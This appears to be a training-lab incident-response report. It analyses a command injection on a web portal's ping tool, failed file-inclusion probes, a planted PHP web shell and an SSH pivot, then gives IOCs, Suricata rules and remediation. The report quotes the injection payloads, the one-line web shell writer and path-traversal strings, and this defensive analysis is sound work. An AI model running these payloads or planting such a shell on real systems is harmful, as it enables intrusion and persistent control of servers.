# INC-2026-005 Findings Report: OS Command Injection and Web Shell

**Engagement:** NexaCorp DFIR, OS Command Injection and Web Shell (web shell deployment, SSH pivot)
**Reference:** BCC-2026 / INC-2026-005
**Target system:** bru-web-01, NexaCorp employee self-service portal
**Reported by:** Marc Wauters, IT Infrastructure Manager
**Date reported:** Monday June 8, 2026
**Analyst:** Johan-Emmanuel Hatchi, SOC Analyst L1, BeCode Corp
**Classification:** Confidential, do not distribute outside BeCode Corp

**Related incidents:** INC-2026-001, INC-2026-002, INC-2026-003 (Linux infrastructure), INC-2026-004 (SQL injection, same host `bru-web-01`)

---

## 1. Executive summary

The employee portal `bru-web-01` was successfully breached on Friday June 5, 2026, over a capture window of roughly eight hours (08:00 to 15:47). An external attacker (172.16.50.10) abused the diagnostic tools page (a "ping a device" feature) to run system commands directly on the server, a vulnerability known as OS command injection. The attacker confirmed code execution under the web server account (www-data), read the contents of the system accounts file (/etc/passwd), and dropped a hidden program (a web shell) that guaranteed repeated access to the server.

A neighbouring feature of the portal (the file viewer) was also probed, but those attempts all failed: the real data leak went through the command injection, not the file viewer. After taking control through the web shell, the attacker logged into the server over SSH using the valid credentials of an employee (j.martin), gaining persistent interactive access.

The root cause is an unfiltered input field that passes commands straight to the OS. Five detection rules were deployed to identify each stage of this type of attack in the future. Priority remediation actions are listed in Section 7.

---

## 2. Incident timeline

*Methodology note: all timestamps come from web_access.log and auth.log (real request time). Wazuh timestamps reflect SIEM indexing time and are not used for the timeline.*

| Time (Jun 5, 2026) | Source IP | Event | Evidence |
|---|---|---|---|
| 08:00:02 | 172.16.50.10 | Portal authentication (login.php, index.php) via curl | web_access.log |
| 11:11:59 | 172.16.50.10 | **First malicious request**: first POST to the ping tool (command injection) | web_access.log |
| 11:53:30 | 172.16.50.10 | POST exec: second command | web_access.log |
| 12:10:20 | 172.16.50.10 | POST exec: third command | web_access.log |
| 12:47:59 | 172.16.50.10 | LFI baseline: `?page=include.php` (response 5510) | web_access.log |
| 12:57:24 | 172.16.50.10 | LFI: `?page=../../../../etc/passwd` (response 3868, failed) | web_access.log |
| 13:35:17 | 172.16.50.10 | POST exec | web_access.log |
| 13:49:04 | 172.16.50.10 | LFI: `?page=../../../../etc/os-release` (3868, failed) | web_access.log |
| 14:15:47 | 172.16.50.10 | POST exec | web_access.log |
| 14:25:00 | 172.16.50.10 | LFI: `?page=../../../../var/log/apache2/access.log` (3868, failed) | web_access.log |
| 14:54:21 | 172.16.50.10 | POST exec | web_access.log |
| 15:13:46 | 172.16.50.10 | LFI: `?page=../../../../var/www/html/dvwa/config/config.inc.php` (3868, failed) | web_access.log |
| 15:34:04 | 172.16.50.10 | POST exec: likely web shell drop (shell.php) | web_access.log |
| 15:35:40 | 172.16.50.10 | **Web shell usage**: `GET /shell.php?cmd=id` (RCE confirmed) | web_access.log + pcap stream 3066 |
| 15:37:23 | 172.16.50.10 | `GET /shell.php?cmd=ls -la /var/www/html/` | web_access.log + pcap stream 3076 |
| 15:47:15 | 172.16.50.10 | **SSH Accepted password for j.martin** (successful pivot, x3) | auth.log |

The intrusion spans roughly eight hours, from the initial login at 08:00 to the SSH pivot at 15:47. The first offensive action, the command injection, lands at 11:11, after about three hours of access. That gap is itself a finding: the attacker held authenticated access well before exploiting it.

---

## 3. Technical analysis

### 3.1 Attack surface

The `bru-web-01` portal exposes a "diagnostic tools" section that includes:
- a **ping tool** (sends ICMP packets, shows the result)
- a **file viewer** (reads system documents)

Both pass user input to the OS without sanitisation. Vectors: **OS Command Injection** (ping tool) and **Local File Inclusion** (file viewer).

### 3.2 Attacker identification

**Attacker IP:** `172.16.50.10`

The attacker shares the `172.16.50.0/24` subnet with background internet scanners (`172.16.50.20-26`), which rules out filtering by IP range alone. The distinction comes from the **request pattern**: the volume from `172.16.50.10` (18 requests) is in fact the lowest in the subnet, but its requests target precise, exploitable endpoints, where the scanners throw generic untargeted noise.

The attacker's 18 requests fall into three zones, which together form the full kill chain:

| Requests | Endpoint | Interpretation |
|---|---|---|
| 7 POST | `/dvwa/vulnerabilities/exec/` | Ping tool: OS command injection |
| 5 GET | `/dvwa/vulnerabilities/fi/?page=...` | File viewer: LFI attempts |
| 2 GET | `/shell.php?cmd=...` | Dropped web shell: RCE confirmed and persistence |
| 4 GET | `/dvwa/login.php`, `/dvwa/index.php` | Authenticated portal access |

### 3.3 Command injection (ping tool)

**URL path:** `/dvwa/vulnerabilities/exec/` (POST method)

Seven POST requests to the ping tool between 11:11:59 and 15:34:04. The payload does not appear in the access log (POST body), but two elements confirm exploitation:

1. **Abnormal and variable response sizes** (5245, 5299, 5254, 6735, 5479, 5347, 5245) where a normal ping would return a stable size. The variation shows that the server is returning the output of different commands.
2. **The dropped web shell**: after the POST at 15:34:04, the attacker accesses `/shell.php?cmd=...`, a file that does not exist in standard DVWA. The final exec POST therefore served to write this shell to disk.

**Running as who:** `www-data`

The pcap follow stream (stream 3066) on `GET /shell.php?cmd=id` gives the server response:

```
HTTP/1.1 200 OK
Server: Apache/2.4.67 (Debian)
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

The attacker runs OS commands under the **`www-data`** account (the Apache user). RCE confirmed. The second command through the shell, `ls -la /var/www/html/` (stream 3076), enumerates the webroot.

**Injected OS commands (in order, reconstructed by follow stream of the 7 POST /exec/):**

| Stream | Decoded payload (POST body) | Goal |
|---|---|---|
| 1269 | `ip=127.0.0.1` | Benign baseline (legitimate ping, vector validation) |
| 1572 | `ip=127.0.0.1;id` | Process identity (`uid=33(www-data)`) |
| 1683 | `ip=127.0.0.1;whoami` | User confirmation |
| 2251 | `ip=127.0.0.1;cat /etc/passwd` | **Read of the system accounts file (real leak)** |
| 2522 | `ip=127.0.0.1;ls -la /var/www/html/` | Webroot enumeration |
| 2783 | `ip=127.0.0.1;uname -a` | Kernel and OS fingerprint |
| 3054 | `ip=127.0.0.1;echo '<?php system($_GET["cmd"]); ?>' > /var/www/html/shell.php` | **Web shell drop** |

The `;` separator (URL-encoded `%3B`) chains the injected command after the legitimate `ip=127.0.0.1`. The payload in stream 2251 is the confirmed source of the `/etc/passwd` leak: the server response contains, in clear text, the line `root:x:0:0:root:/root:/bin/bash` and the full set of local accounts, including `j.martin:x:1001:1001`. Stream 3054 is the POST that writes the web shell to disk, preceding its two GET uses.

**Commands confirmed through the deployed web shell:**
1. `id` (stream 3066): response `uid=33(www-data) gid=33(www-data) groups=33(www-data)`
2. `ls -la /var/www/html/` (stream 3076)

### 3.4 Local File Inclusion (file viewer): the trap

**URL path and parameter:** `/dvwa/vulnerabilities/fi/?page=`

Five GET requests observed, each one once:

| Page requested | Type |
|---|---|
| `include.php` | Baseline (legitimate viewer file) |
| `../../../../etc/passwd` | Traversal: system accounts |
| `../../../../etc/os-release` | Traversal: OS version |
| `../../../../var/www/html/dvwa/config/config.inc.php` | Traversal: DVWA DB config |
| `../../../../var/log/apache2/access.log` | Traversal: Apache log (log poisoning attempt?) |

**VERDICT: the LFI FAILED.** The response sizes prove it:

| Page requested | Response size |
|---|---|
| `include.php` (baseline) | 5510 |
| `../../../../etc/passwd` | 3868 |
| `../../../../etc/os-release` | 3868 |
| `../../../../var/log/apache2/access.log` | 3868 |
| `../../../../var/www/html/dvwa/config/config.inc.php` | 3868 |

The four traversals all return exactly **3868 bytes**, identical to each other and different from the baseline (5510). The file viewer served its error / default page on every attempt, never including the requested file content. **No data left through this channel.** The real leak of `/etc/passwd` (and other system information) came from the command injection on the ping tool, NOT from the file viewer. This is the precise distinction required by questions 4 and 6.

### 3.5 What data was actually exposed

**Leak channel: the command injection, exclusively.**

| Data | Channel | Status |
|---|---|---|
| `id` / www-data identity | Command injection (shell.php) | Exposed |
| Webroot contents (`ls /var/www/html/`) | Command injection (shell.php) | Exposed |
| `/etc/passwd`, `/etc/os-release`, DVWA config, Apache log | File viewer (LFI) | **Not exposed** (LFI failed, 3868 responses) |

Key point for the report: the file viewer (LFI) was probed but disclosed **nothing** (default page every time, identical 3868-byte responses). All the system information the attacker actually obtained went through the command injection and the web shell. The `j.martin` account reused over SSH appears in the output of `cat /etc/passwd` (stream 2251), confirming the attacker knew the account existed before the pivot. The password itself is not visible in /etc/passwd (the `x` field, hash held in /etc/shadow), so the credential was either guessed, obtained by some other means not visible in the PCAP, or already known to the attacker.

---

## 4. Persistence and consequence

### 4.1 Persistence artifact

**Persistence artifact:** `/shell.php`

The access log shows two GET requests to `/shell.php` with a `cmd` parameter:
- `/shell.php?cmd=id`
- `/shell.php?cmd=ls -la /var/www/html/` (encoded: `ls+-la+%2Fvar%2Fwww%2Fhtml%2F`)

`/shell.php` does not exist in a standard DVWA install: this file was created by the attacker. The presence of a `cmd` parameter executed over GET confirms a **working web shell**. This is direct proof of the RCE and of persistence.

**POST that wrote the shell (confirmed):** stream 3054, timestamp 13:34:04 (internal PCAP time), body:
`ip=127.0.0.1;echo '<?php system($_GET["cmd"]); ?>' > /var/www/html/shell.php`

This POST precedes the two GET uses of the shell (15:35:40 and 15:37:23 in the access log). The ordering, deployment (POST, command injection) then usage (GET, /shell.php?cmd=), is the exact distinction tested by the Phase 2 flags "web shell write" and "web shell usage". The response to the first use (`?cmd=id`, stream 3066) does contain the command output (`uid=33(www-data)...`), confirming that the shell executes code and does not return an error page.

### 4.2 Pivot account

**Pivot account:** `j.martin`

auth.log shows a **successful** SSH login from the attacker IP:

```
2026-06-05T15:47:15 bru-web-01 sshd[13158]: Accepted password for j.martin from 172.16.50.10 port 44061 ssh2
2026-06-05T15:47:17 bru-web-01 sshd[13185]: Accepted password for j.martin from 172.16.50.10 port 41461 ssh2
2026-06-05T15:47:20 bru-web-01 sshd[13195]: Accepted password for j.martin from 172.16.50.10 port 60839 ssh2
```

Key points:
- **Accepted**, not Failed: the attacker holds a valid SSH credential for `j.martin`.
- Source `172.16.50.10`: same IP as all the web activity, direct correlation.
- Timing: 15:47, about 10 minutes after the web shell use (15:37). The password was likely obtained through the command injection (reading a config or credentials file), not through the LFI, which failed.
- Three short successive logins (Accepted then immediate disconnect), consistent with a credential validity test or automation.

This authenticated SSH access on `bru-web-01` is the main consequence of the incident and the starting point for Lab 6: the attacker now holds a persistent interactive foothold, independent of the web shell.

---

## 5. Indicators of Compromise (IOC)

Indicators consolidated from web_access.log, auth.log and the PCAP analysis:

| Type | Value |
|---|---|
| Attacker IP | `172.16.50.10` |
| Command injection endpoint | `/dvwa/vulnerabilities/exec/` (POST) |
| LFI endpoint | `/dvwa/vulnerabilities/fi/?page=` (GET) |
| Web shell endpoint | `/shell.php?cmd=` (GET) |
| Payload pattern (cmd injection) | POST to `/exec/`; web shell `/shell.php?cmd=`; commands `id`, `ls` |
| Payload pattern (LFI) | `?page=../../../../etc/passwd` (and os-release, config.inc.php, access.log) |
| Persistence artifact | `/shell.php` |
| Pivot account | `j.martin` (SSH Accepted from 172.16.50.10 at 15:47) |

---

## 6. Detection recommendations (Suricata)

Five rules were developed, one per distinct stage of the kill chain, and validated against the PCAP in offline mode (`suricata -r`, deterministic TCP reassembly). Each rule targets a Suricata buffer matched to its intent:

- `http.request_body` (raw, URL-encoded) for the request-side injection payloads
- `http.uri` (normalised) for web shell usage
- `file_data` (response body) for response-side detection, which proves successful exploitation rather than a mere attempt

**Ruleset (file `/etc/suricata/rules/learner/lab.rules`, analyst SID range 1000001-1000005):**

```
alert http any any -> any any (msg:"LAB05 sensitive file targeting in command injection body"; flow:established,to_server; http.request_body; content:"etc"; nocase; sid:1000001; rev:4;)
alert http any any -> any any (msg:"LAB05 web shell usage cmd param"; flow:established,to_server; http.uri; content:"shell.php"; nocase; content:"cmd="; nocase; sid:1000002; rev:1;)
alert http any any -> any any (msg:"LAB05 web shell write via command injection"; flow:established,to_server; http.request_body; content:"shell.php"; nocase; sid:1000003; rev:1;)
alert http any any -> any any (msg:"LAB05 RCE confirmed www-data in response"; flow:established,to_client; file_data; content:"www-data"; sid:1000004; rev:7;)
alert http any any -> any any (msg:"LAB05 data exfil etc-passwd content in response"; flow:established,to_client; file_data; content:"root:x:0:0"; sid:1000005; rev:6;)
```

**Per-rule logic:**

| SID | Stage detected | Buffer | Match | Alerts (offline) |
|---|---|---|---|---|
| 1000001 | System file targeting in the injection | `http.request_body` | `etc` in the POST body | 1 |
| 1000002 | Web shell usage | `http.uri` | `shell.php` + `cmd=` | 2 |
| 1000003 | Web shell write | `http.request_body` | `shell.php` in the POST body | 1 |
| 1000004 | RCE confirmed, response side | `file_data` | `www-data` in the response | 6 |
| 1000005 | /etc/passwd exfiltration, response side | `file_data` | `root:x:0:0` in the response | 1 |

**Proof (fast.log extract, offline PCAP replay):**

```
=== BY SID ===
      1 [1:1000001:4]
      2 [1:1000002:1]
      1 [1:1000003:1]
      6 [1:1000004:7]
      1 [1:1000005:6]
```

All five rules fire. The offline count is deterministic (Suricata reads the PCAP in `-r`, full reassembly without network timing constraints), unlike the live replay (`tcpreplay`) which, on this infrastructure (MTU 1450 interface, topspeed replay), loses reassembly of large multi-segment responses and gives counts that are unstable from run to run. For a forensic report, the offline count is the reliable reference.

**Methodology note (count discrepancy):** rule 1000002 (web shell usage) produces 2 alerts offline, one per real shell request (`?cmd=id` and `?cmd=ls`, the only requests to `shell.php` in the whole PCAP, confirmed via tshark). The CTF platform scored this flag at 4, a difference attributable to TCP retransmissions during its live replay. The forensically exact count is **2**.

**False positive analysis:**

| SID | FP risk | Production mitigation |
|---|---|---|
| 1000001 | `content:"etc"` is broad: a legitimate POST body containing the word "etc" (an abbreviation, a free-text field) would fire. Risk is nil here (no normal portal traffic contains "etc"), but to be tightened in production. | Replace with `%2Fetc%2F` or require the path context (`;` separator + `/etc/`) so it only matches an injected system path. |
| 1000002 | Low. The `shell.php` + `cmd=` combination in the URI is highly specific to a web shell. | Restrict to the GET method and the exact `/shell.php` path once the webroot is known. |
| 1000003 | Low. `shell.php` in a POST body is abnormal. | Combine with detection of the injection separator (`%3B`) to reduce further. |
| 1000004 | `content:"www-data"` matches any response containing that string, including DVWA pages that display the user context. On this PCAP, 6 responses match (command outputs AND context pages). In production, legitimate content could mention www-data. | Combine with `content:"uid="` (the output of `id`) to match only strict proof of execution, which brings the count down to the 2 responses containing `uid=33(www-data)`. A sensitivity / specificity trade-off to set by context. |
| 1000005 | Very low. `root:x:0:0` in an HTTP response means a /etc/passwd file leaked in the body: there is no legitimate case where this string appears in a normal web response. Excellent rule, near-zero FP. | None, the rule is usable as is. |

**Validation workflow used:**
```
sudo suricata -c /etc/suricata/suricata.yaml -r attack.pcap -l ~/suri-offline \
  -S /etc/suricata/rules/learner/lab.rules --runmode single
grep -oE '\[1:[0-9]+:[0-9]+\]' ~/suri-offline/fast.log | sort | uniq -c
```

---

## 7. Remediation recommendations

Five priority actions, in order of urgency:

1. **Immediate containment.** Remove the web shell `/var/www/html/shell.php` from the server. Run a full integrity scan of the webroot (`/var/www/html/`) to detect any other dropped file. Block IP `172.16.50.10` at the perimeter (firewall / WAF).

2. **Rotate the compromised credential.** Force a password change for `j.martin` and audit all SSH sessions from `172.16.50.10` (auth.log, last, system journals). Verify that no SSH key or cron job was added under this account.

3. **Fix the root cause.** The diagnostic page (ping tool and file viewer) passes user input straight to the OS via `system()`. Either remove these features if they are not business-critical, or rewrite them to never pass user input to a shell: use native libraries (application-level ping, strict allowlist file reads) and validate input against an allowlist, with no shell metacharacters permitted.

4. **Deploy detection.** Put the five Suricata rules from Section 6 into production, replacing `content:"any"` with network variables correctly scoped to the protected segment, and tightening rule 1000001 (`etc` too broad) toward a system path context. Alert the SOC on any match.

5. **Baseline hardening.** Apply least privilege to the `www-data` account (no write access to the webroot in production). Segment the web server from the rest of the internal network to limit lateral pivoting. Re-audit bru-web-01 after INC-2026-004 (SQLi on the same host): two distinct injection vulnerabilities on the same machine within a few days point to a need for a full application code review.

---

*BeCode Corp, Incident Response Division*
*Classification: Confidential, do not distribute outside BeCode Corp*
